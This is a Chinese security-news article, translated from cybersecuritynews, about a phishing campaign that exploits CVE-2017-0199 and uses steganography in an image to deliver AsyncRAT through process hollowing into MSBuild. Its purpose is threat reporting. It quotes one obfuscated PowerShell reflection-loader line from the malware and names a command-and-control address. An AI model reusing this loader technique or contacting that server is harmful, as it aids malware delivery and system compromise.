---
title: 警惕！新型隐写术攻击活动利用 Microsoft Office 漏洞传播 AsyncRAT
url: https://www.anquanke.com/post/id/306865
source: 安全客-有思想的安全新媒体
date: 2025-04-26
fetch_date: 2025-10-06T22:04:06.352476
---

# 警惕！新型隐写术攻击活动利用 Microsoft Office 漏洞传播 AsyncRAT

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 警惕！新型隐写术攻击活动利用 Microsoft Office 漏洞传播 AsyncRAT

阅读量**56545**

发布时间 : 2025-04-25 09:52:34

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/new-stego-campaign-leverages-ms-office-vulnerability/>

译文仅供参考，具体内容表达以及含义原文为准。

网络安全研究人员发现了一场复杂的恶意软件攻击活动，该活动运用了隐写技术，将恶意代码隐藏在看似无害的图像文件中。

这条攻击链利用了 Microsoft Office 的一个旧漏洞（CVE-2017-0199），最终传播了 AsyncRAT，这是一种远程访问木马，能够让攻击者完全控制受害者的系统。

攻击始于包含恶意Microsoft Office 文档的网络钓鱼电子邮件，这些文档旨在利用 CVE-2017-0199 漏洞，该漏洞于 2017 年 4 月首次被报告。

当这些文档被打开时，无需任何用户交互，它们就会触发远程 HTA 脚本的下载和执行。随后，该 HTA 脚本会下载一个被植入木马的合法 Windows 实用程序 Prnport.vbs。

一旦执行，被篡改的 Prnport.vbs 文件会构建并执行一个复杂的 PowerShell 脚本，该脚本会下载一个包含隐藏恶意代码的图像文件。

这个 PowerShell 脚本乍一看似乎无害，但包含了多种用于逃避检测的混淆技术。

Sophos 的研究人员认为，这场攻击活动特别危险，因为它具有多阶段的特性，并且使用了隐写技术来绕过传统的安全控制措施。

一位研究这场攻击活动的 Sophos 分析师指出：“这次攻击展示了威胁行为者的技术在不断演变。通过将恶意代码隐藏在普通图像中，攻击者可以绕过许多不会检查图像文件中是否存在可执行内容的安全解决方案。”

****攻击流程****

这次攻击最具创新性的方面在于所使用的隐写技术，即把恶意注入器动态链接库（DLL）隐藏在一个看似无害的图像文件中。

当受害者打开被篡改的图像时，他们看到的只是一张普通的照片，却不知道恶意代码就隐藏在其中。

PowerShell 脚本通过在图像数据中定位特定的 Base64 标记（> 和 >）来提取隐藏的代码。

提取出的代码显示出一个名为 “Microsoft.Win32.TaskScheduler” 的 DLL 文件，它运用进程空洞化技术将 AsyncRAT 的有效载荷注入到一个合法的 MSBuild 进程中。

这种技术使得恶意软件能够伪装成一个受信任的 Windows 进程来运行，这大大增加了检测的难度。

\(injectorReflection = [Reflection.Assembly]::(‘Lo’ + ‘ad’)(\)decodedInjector); \(executeMethod = [dnlib.IO.Home].(‘GetM’ + ‘ethod’)(‘VAI’).(‘Inv’ + ‘oke’)(\)null, @($finalPayloadURL, $null, $null, $null, “MsBuild”))

最终的有效载荷 AsyncRAT 会与位于 148.113.214.176:7878 的命令与控制服务器进行通信。

这个开源的远程访问工具为攻击者提供了广泛的功能，包括远程桌面访问、键盘记录，以及部署包括勒索软件在内的其他恶意软件的能力。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/new-stego-campaign-leverages-ms-office-vulnerability/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306865](/post/id/306865)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/new-stego-campaign-leverages-ms-office-vulnerability/)

如若转载,请注明出处： <https://cybersecuritynews.com/new-stego-campaign-leverages-ms-office-vulnerability/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**8赞

收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p2.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [CISA称黑客利用GeoServer漏洞成功入侵一联邦机构](/post/id/312347)

  2025-09-24 16:45:06
* ##### [SolarWinds紧急发布补丁，修复高危远程代码执行漏洞CVE-2025-26399](/post/id/312357)

  2025-09-24 16:43:11
* ##### [Chrome浏览器存在高危漏洞，可致攻击者窃取敏感信息并引发系统崩溃](/post/id/312366)

  2025-09-24 16:42:08
* ##### [CVE-2025-55241：CVSS评分10.0的Microsoft Entra ID漏洞可能危及全球所有租户](/post/id/312294)

  2025-09-22 18:14:51

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)